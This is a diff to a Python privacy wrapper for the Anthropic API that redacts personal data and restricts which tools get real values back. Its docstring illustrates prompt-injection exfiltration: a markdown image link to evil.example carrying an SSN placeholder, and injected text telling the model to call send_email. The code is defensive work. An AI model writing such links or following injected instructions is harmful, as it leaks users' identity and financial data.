@@ -4,7 +4,7 @@
     from veil import Redactor, FINANCE
     from veil.anthropic import wrap
 
-    client = wrap(anthropic.Anthropic(), Redactor(FINANCE))
+    client = wrap(anthropic.Anthropic(), Redactor(FINANCE), restore={"add_member": "all"})
     client.redactor.add_person("Avery K. Mockridge")      # people you already know of
     reply = client.messages.create(model="claude-opus-5-5", max_tokens=1024, tools=TOOLS,
                                    messages=[{"role": "user", "content": "Add Avery Mockridge as an LP"}])
@@ -42,13 +42,15 @@ tool call's input is checked too: a taxpayer ID in one is taken out, and a
 call it objects to, or can't check, raises GuardrailError, so no tool runs on
 it.
 
-A placeholder in a reply's text or a tool call comes back as its real value,
-except inside a URL or a link's target, where it stays a placeholder: text
-the model was tricked into writing ("![](https://evil.example/?d=SSN_001)")
-can't carry a real value off when it's shown or fetched (``restore_urls=True``
-lets it).  ``restore`` says which kinds each tool gets back, so a tool that
-sends things out can be kept to placeholders:
-``restore={"add_member": {"NAME", "SSN"}, "*": set()}``.
+A placeholder in a reply's text comes back as its real value, except inside a
+URL or a link's target, where it stays a placeholder: text the model was
+tricked into writing ("![](https://evil.example/?d=SSN_001)") can't carry a
+real value off when it's shown or fetched (``restore_urls=True`` lets it).
+A tool call gets real values back only for the tools ``restore`` names, so
+text that tells the model to call ``send_email`` with ``SSN_001`` sends the
+placeholder: ``restore={"add_member": "all", "notify": {"EMAIL"}}``, with
+``"*"`` for any other tool, or ``restore="all"`` for every tool.  A tool it
+doesn't name gets placeholders, and a warning says so.
 
 Streaming isn't supported yet: ``stream=True`` raises, and so do
 ``messages.stream``, ``parse``, ``batches``, ``tool_runner`` and the raw
@@ -60,6 +62,7 @@ from __future__ import annotations
 import base64
 import copy
 import hashlib
+import warnings
 from dataclasses import dataclass, field
 from typing import Any, Callable, Collection, Mapping
 
@@ -128,7 +131,8 @@ class Session:
 
     def __init__(self, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
                  files: str | Callable[[bytes, str], str] = "refuse",
-                 restore: Mapping[str, Collection[str] | str | None] | None = None, restore_urls: bool = False,
+                 restore: Mapping[str, Collection[str] | str | None] | str | None = None,
+                 restore_urls: bool = False,
                  user_location: str = "country", mcp_servers: str = "refuse", domains: str = "check"):
         self.redactor = redactor if redactor is not None else Redactor()
         if domains not in ("check", "send"):
@@ -140,9 +144,14 @@ class Session:
         if user_location not in ("country", "send", "drop"):
             raise ValueError('user_location must be "country", "send" or "drop"')
         self.user_location = user_location
-        # The kinds each tool's calls get back, by tool name ("*": any other tool); None: every kind.
-        self.restore = {name: {kinds} if isinstance(kinds, str) else None if kinds is None else set(kinds)
-                        for name, kinds in (restore or {}).items()}
+        # The kinds each tool's calls get back, by tool name ("*": any other tool); None: every kind.  A tool
+        # it doesn't name gets none.
+        if isinstance(restore, str) and restore != "all":
+            raise ValueError('restore must be "all" or {tool name: kinds}')
+        self.restore = {"*": None} if restore == "all" else {
+            name: None if kinds is None or kinds == "all" else {kinds} if isinstance(kinds, str) else set(kinds)
+            for name, kinds in (restore or {}).items()}
+        self._warned: set[str] = set()   # tools a warning has named
         self.restore_urls = restore_urls
         self.guardrail = guardrail
         self.redact_system = redact_system
@@ -406,9 +415,16 @@ class Session:
                 self._set(content, i, block, "text",
                           self.redactor.restore_text(self._get(block, "text"), urls=self.restore_urls))
             elif kind == "tool_use":
-                kinds = self.restore.get(self._get(block, "name"), self.restore.get("*"))
-                self._set(content, i, block, "input",
-                          self.redactor.restore(self._get(block, "input"), kinds, urls=self.restore_urls))
+                name, data = self._get(block, "name"), self._get(block, "input")
+                kinds = self.restore.get(name, self.restore.get("*", set()))
+                restored = self.redactor.restore(data, kinds, urls=self.restore_urls)
+                if name not in self.restore and "*" not in self.restore and name not in self._warned and \
+                        restored != self.redactor.restore(data, urls=self.restore_urls):
+                    self._warned.add(name)
+                    warnings.warn(f"veil gave the {name!r} tool placeholders, not real values, since restore doesn't "
+                                  f'name it: pass restore={{{name!r}: "all"}} (or the kinds it needs) if it should '
+                                  "get them.", stacklevel=3)
+                self._set(content, i, block, "input", restored)
         return response
 
     def _guard_reply(self, content: list) -> None:
@@ -620,7 +636,7 @@ class VeiledClient:
 
 def wrap(client, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
          files: str | Callable[[bytes, str], str] = "refuse",
-         restore: Mapping[str, Collection[str] | str | None] | None = None,
+         restore: Mapping[str, Collection[str] | str | None] | str | None = None,
          restore_urls: bool = False, user_location: str = "country", mcp_servers: str = "refuse",
          domains: str = "check") -> VeiledClient:
     """``client`` (anthropic.Anthropic, AnthropicBedrock ...) with placeholders on the way out and real values
@@ -630,8 +646,8 @@ def wrap(client, redactor: Redactor | None = None, guardrail=None, redact_system
     here and send it redacted instead, "send" them as they are, or a function ``(data, media_type) -> text`` to read them.
 
     ``restore`` says which placeholder kinds each tool's calls get back as real values, by tool name, with
-    ``"*"`` for any tool not named (``{"add_member": {"NAME", "SSN"}, "*": set()}``); a tool it doesn't cover
-    gets every kind.  ``restore_urls``: put real values back inside URLs too (by default they stay placeholders).
+    ``"all"`` for every kind and ``"*"`` for any tool not named (``{"add_member": "all", "notify": {"EMAIL"}}``),
+    or ``"all"`` for every tool.  A tool it doesn't name gets placeholders only, with a warning the first time.  ``restore_urls``: put real values back inside URLs too (by default they stay placeholders).
 
     ``user_location``: what web search's ``user_location`` sends, "country" (its country and timezone, the
     default), "send" (all of it, city and region too) or "drop" (none).
